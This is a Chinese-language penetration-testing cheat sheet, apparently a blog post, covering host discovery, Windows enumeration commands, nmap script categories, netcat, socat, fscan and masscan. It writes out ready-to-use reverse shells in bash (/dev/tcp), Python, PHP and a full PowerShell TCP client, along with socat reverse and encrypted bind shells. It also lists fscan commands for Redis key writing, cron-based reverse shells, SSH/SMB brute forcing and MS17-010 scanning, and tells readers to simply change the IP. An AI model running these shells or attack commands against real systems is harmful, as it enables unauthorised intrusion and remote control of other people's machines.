00 信息收集的方向  
1\. 主机存活探测  
2\. 主机端口开放情况  
3\. 主机服务探测  
4\. 主机操作系统探测  
5\. 网段分布情况  
6\. 漏洞信息探测  
7\. 主机内部信息搜集 / 域内信息搜集  
01 主机内部信息收集  
操作系统默认 ttl 值  
① WINDOWS NT/2000 TTL:128  
② WINDOWS 95/98 TTL:32  
③ UNIX TTL:255  
④ LINUX TTL:64  
⑤ WIN7 TTL:64  
基于 icmp 协议的主机存活探测  
① windows  
for /l %i in (1,1,255) do @ ping 192.168.1.%i -w 1 -n 1 | findstr "TTL="  
② linux  
for i in {1..254};do ping -w 1 -c 1 121.5.144.$i|grep "ttl="|awk '{print
$4}'|awk -F ":"  
'{print $1}';done  
1\. 查看网络配置信息  
ipconfig /all  
2\. 查询操作系统和版本信息  
systeminfo | findstr /B /C:”OS 名称 ” /C:”OS 版本 ” ( 如果是英文版的中文切换成英文 ）  
3\. 查看安装的软件及版本、路径等  
wmic product get name,version ( 可能会很慢 )  
4\. 查看进程信息  
1-tasklist  
2-wmic process list brief  
!!!:  
wmic(windows management instrumentation command-line) :windows 管理工具命令行  
5\. 查看用户信息  
net user  
6\. 查看本地管理员组  
net localgroup administrators  
7\. 查询端口列表  
netstat -ano  
8\. 查看补丁列表  
1-systeminfo | findstr “KB”  
2-wmic qfe get Caption,HotFixID,Description,InstalledOn  
9\. 查询共享列表  
1-netshare  
2-wmic share get name,path,status  
10\. 查看当前用户  
whoami  
02 Nmap的使用  
常见端口漏洞

![1637595595_619bb9cbccc83b96cd731.png!small](https://image.3001.net/images/20211122/1637595595_619bb9cbccc83b96cd731.png!small)

![1637595606_619bb9d641eafe863d438.png!small](https://image.3001.net/images/20211122/1637595606_619bb9d641eafe863d438.png!small)

nmap 是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。  
确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦  
称 fingerprinting ）。它是网络管理员必用的软件之一，以及用以评估网络系统  
安全。  
优点 ：高效、开源、功能齐全  
Banner ：指软件开发商、软件名称、版本、服务类型等信息。  
功能 ：  
§ 1- 存活主机  
§ 2- 端口扫描  
§ 3- 防火墙侦测  
§ 4- 漏洞扫描  
§ 5- 操作系统用法：nmap [扫描类型] [选项] {目标规范}  
• 例如：nmap -sSV -F -T4 192.168.37.0/24  
• 常用命令：  
• -Pn：将所有主机视为联机-跳过主机发现  
-v|-vv：详细|更详细过程  
• -sS：SYN扫描（隐匿）  
• -sV：探测打开的端口以确定服务/版本信息  
• -O：启用操作系统检测  
• -T <0-5>：设置时序模板（越高越快）T4  
• -A：综合扫描  
• -p：端口范围 可以-p-（代表全端口)|-p 0-65535 |-p 80,445,3389

![1637595639_619bb9f7a06cbc0dd334f.png!small](https://image.3001.net/images/20211122/1637595639_619bb9f7a06cbc0dd334f.png!small)![1637595658_619bba0a639c90e37ceed.png!small](https://image.3001.net/images/20211122/1637595658_619bba0a639c90e37ceed.png!small)信息收集（使用脚本）：  
-sC ：相当于 --script=defaults  
smb-check-vulns.nse smb 服务漏洞探测  
nmap --script=smb-check-vulns.nse IP  
nmap 脚本存放位置：  
/usr/share/nmap/scripts/  
auth: 负责处理鉴权证书（绕开鉴权）的脚本  
broadcast: 在局域网内探查更多服务开启状况，如 dhcp/dns/sqlserver 等服务  
brute: 提供暴力破解方式，针对常见的应用如 http/snmp 等  
default: 使用 -sC 或 -A 选项扫描时候默认的脚本，提供基本脚本扫描能力  
discovery: 对网络进行更多的信息，如 SMB 枚举、 SNMP 查询等  
dos: 用于进行拒绝服务攻击  
exploit: 利用已知的漏洞入侵系统  
external: 利用第三方的数据库或资源，例如进行 whois 解析  
fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，  
此类脚本可能引发对方的 IDS/IPS 的记录或屏蔽  
malware: 探测目标机是否感染了病毒、开启了后门等信息  
safe: 此类与 intrusive 相反，属于安全性脚本  
version: 负责增强服务与版本扫描（ Version Detection ）功能的脚本  
vuln: 负责检查目标机是否有常见的漏洞（ Vulnerability ），如是否有 MS08_067  
03 NC  
功能强大的网络工具，在网络工具中有 “ 瑞士jundao ” 美誉，其有 Windows  
和 Linux 的版本。因为它短小精悍 , 功能实用，被设计为一个简单、可靠的网络  
工具，可通过 TCP 或 UDP 协议传输读写数据。同时，它还是一个网络应用  
Debug 分析器，因为它可以根据需要创建各种不同类型的网络连接。  
nc 的作用  
（ 1 ）实现任意 TCP/UDP 端口的侦听， nc 可以作为 server 以 TCP 或 UDP 方式侦  
听指定端口  
（ 2 ）端口的扫描， nc 可以作为 client 发起 TCP 或 UDP 连接  
（3 ）传输文件  
（4 ）网络测速  
（5 ）克隆硬盘或分区  
（6 ）反弹服务器 shell  
常用命令介绍：  
§ -v （  
verbose 详细）：详细信息 -z （  
zero-I/0 ）：无输入输出扫描 可用端口扫描  
§ -l （  
listen 监听）：监听  
§ -p （  
port ）：端口  
§ -t （  
telnet ）： telnet 方式访问  
§ -e （  
exec ）：执行命令 --->  
§ 监听： nc -l -p xx 常用 nc -lvvp xx  
§ 反弹 shell ：  
端口探测：  
§ -vz ：  
文件传输：  
§ 接收端： nc -lvvp > 文件名（任意）  
§ 发送端： nc IP PORT < 文件名（存在的）  
§ ps ：连接成功则传输成功  
NC连接shell的其他方式  
1.bash -i >& /dev/tcp/ip/port 0>&1  
解释：  
bash -i 打开一个交互的 bash  
>& 将标准错误输出重定向到标准输出  
/dev/tcp/x.x.x.x/port 意为调用 socket, 建立 socket 连接 , 其中 x.x.x.x 为要反弹到的主机 ip ，
port 为端口  
0>&1 标准输入重定向到标准输出，实现你与反弹出来的 shell 的交互  
注：  
/dev/tcp/ 是 Linux 中的一个特殊设备 , 打开这个文件就相当于发出了一个 socket 调用，建立一个 socket 连接，  
读写这个文件就相当于在这个 socket 连接中传输数据。同理， Linux 中还存在 /dev/udp/ 。  
linux shell 下常用的文件描述符是：  
1\. 标准输入 (stdin) ：代码为 0 ，使用 < 或 << ；  
2\. 标准输出 (stdout) ：代码为 1 ，使用 > 或 >> ；  
3\. 标准错误输出 (stderr) ：代码为 2 ，使用 2> 或 2>> 。  
另外由于不同 Linux 发行版之间的差异，该命令在某些系统上可能并不适用。  
python 反弹 shell  
python -c 'import  
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STRE  
AM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);  
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
直接用就好了，改 ip 就行。  
php 反弹 shell  
php -r '$sock=fsockopen(“IP”,port);exec(“/bin/sh -i <&3 >&3 2>&3”);  
powershell:  
$client = New-Object System.Net.Sockets.TCPClient('192.168.0.102',4444);  
$stream = $client.GetStream();  
[byte[]]$bytes = 0..65535|%{0};  
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)  
{  
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,
$i);  
$sendback = (iex $data 2>&1 | Out-String );  
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';  
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);  
$stream.Write($sendbyte,0,$sendbyte.Length);  
$stream.Flush();  
}  
$client.Close();  
04 socat  
Socat 是一个命令行实用程序，它建立两个双向字节流并在它们之间传  
输数据。对于渗透测试，它与 Netcat 类似，但具有其他有用的特性。  
创建监听 :  
socat TCP4-LISTEN:port STDOUT  
连接 :  
socat - TCP4:IP:PORT  
!!!: 单纯的建立连接需要加 - 和 stdout, 建立标准的输入输出流  
文件传输 :  
传输  
socat tcp4-listen:port,fork file:filename  
!!!:fork 用于创建子进程 , 允许多个连接  
接收  
socat tcp4:ip:port file:filename,create  
!!!:create 用于生成文件 , 生成文件及传输方向两边都行  
反向 shell  
socat -d -d tcp4-listen:4444 stdout  
监听 shell 反弹  
socat tcp4:ip:port exec:/bin/bash  
反弹 shell  
加密的正向 shell  
我们将使用 openssl 应用程序通过以下选项创建自签名证书：  
req ：启动新的证书签名请求  
-newkey ：生成一个新的私钥  
rsa:2048 ：使用密钥长度为 2048 位的 RSA 加密。  
-nodes ：存储不带密码保护的私钥  
-keyout ：将密钥保存到文件  
-x509 ：输出自签名证书而不是证书请求  
-days ：以天为单位设置有效期  
-out ：将证书保存到文件  
生成密钥 ( 公钥和私钥 )  
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362
-out  
bind_shell.crt  
把公钥和私钥转为 socat 接收的格式  
cat bind_shell.key bind_shell.crt > bind_shell.pem  
建立监听与连接  
socat openssl-listen:port,cert=bind_shell.pem,verify=0,fork exec:/bin/bash  
!!!:verify=0 --> 禁用 ssl 验证  
socat - openssl:ip:port,verify=0  
05 fscan  
https://github.com/shadow1ng/fscan  
fscan.exe -h 192.168.1.1/24 ( 默认使用全部模块 )  
fscan.exe -h 192.168.1.1/16 (B 段扫描 )  
fscan.exe -h 192.168.1.1/24 -np -no -nopoc( 跳过存活检测 、不保存文件、跳过 web poc 扫描 )  
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥 )  
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹 shell)  
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行 )  
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 ( 指定模块 ssh 和端口 )  
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (
加载指定文件的用户名、密码来进行爆破 )  
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt ( 指定扫描结果保存路径 , 默认保存在当前路径 )  
fscan.exe -h 192.168.1.1/8 (A 段的 192.x.x.1 和 192.x.x.254, 方便快速查看网段信息 )  
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb 密码碰撞 )  
fscan.exe -h 192.168.1.1/24 -m ms17010 ( 指定模块 )  
fscan.exe -hf ip.txt ( 以文件导入 )  
fscan.exe -u http://baidu.com -proxy 8080 ( 扫描单个 url, 并设置 http 代理
http://127.0.0.1:8080)  
masscan ：被称为最快的端口扫描器， 6 分钟可以扫描全网。  
\--rate:  
指定发包速率  
\--ports:  
指定端口  
\--adapter-ip:  
指定发包的 IP 地址  
\--adapter-port:  
指定发包的端口号  
\--adapter-mac:  
指定发包的源 mac  
\--router-mac:  
指定网关的 mac  
\--exclude:  
黑名单 , 不扫描指定的 IP  
\--wait:  
设置发完包后默认 (10s) 的等待时间  
06 masscan  
# web 常用  
masscan 127.0.0.0/24
-p80,161,443,873,2181,3389,6379,7001,8000,8009,8080,9000,9009,9090,9200,9300,10000,50070
> results.txt  
# 远程登录  
masscan 127.0.0.0/24 -p22,23,3389,5632,5800,5900,5901 > results.txt  
# 文件服务  
masscan 127.0.0.0/24 -p20,21,445,873,2049 > results.txt  
# 数据库  
masscan 127.0.0.0/24
-p1433,1521,3306,4100,5000,5432,5984,6379,11211,27017,27018 > results.txt  
# 单端口扫描  
masscan 127.0.0.0/24 -p443  
# 多端口扫描 扫描 80 或 443 端口的 B 类子网  
masscan 127.0.0.0/24 -p80,443  
# 扫描一系列端口 扫描 22 到 25 端口的 B 类子网  
masscan 127.0.0.0/24 -p22-25  
# 快速扫描  
masscan 127.0.0.0/24 -p80,8000-9000 --rate 100000  
# 排除目标  
masscan 127.0.0.0/24 -p80,8000-9000 --excludefile exclude.txt  
# 结果保存  
masscan 127.0.0.0/24 -p80,8000-9000 > results.txt

